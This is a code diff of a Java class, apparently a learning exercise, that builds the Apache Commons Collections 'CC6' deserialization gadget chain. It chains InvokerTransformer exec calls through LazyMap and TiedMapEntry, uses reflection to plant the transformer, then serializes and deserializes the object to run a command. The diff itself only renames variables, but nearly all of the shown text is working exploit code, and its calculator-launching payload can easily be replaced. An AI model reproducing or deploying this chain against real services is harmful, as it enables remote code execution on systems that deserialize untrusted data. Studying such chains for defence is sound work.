@@ -21,12 +21,12 @@ public class CC6 {
                 new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
         };
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-        HashMap<Object, Object> map = new HashMap<>();
-        Map<Object, Object> lazyMap = LazyMap.decorate(map,  new ConstantTransformer(1) );
+        HashMap map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map,  new ConstantTransformer(1) );
 
         TiedMapEntry tidemapentry = new TiedMapEntry(lazyMap, "raindrop");
-        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();
-        objectObjectHashMap.put(tidemapentry,"abc");
+        HashMap map1 = new HashMap();
+        map1.put(tidemapentry,"abc");
 
         Class c = LazyMap.class;
         Field factoryField = c.getDeclaredField("factory");
@@ -34,7 +34,7 @@ public class CC6 {
         factoryField.set(lazyMap,chainedTransformer);
         map.remove("raindrop");
 
-        Utils.serialize(objectObjectHashMap);
+        Utils.serialize(map1);
         Utils.deserialize();
     }
 
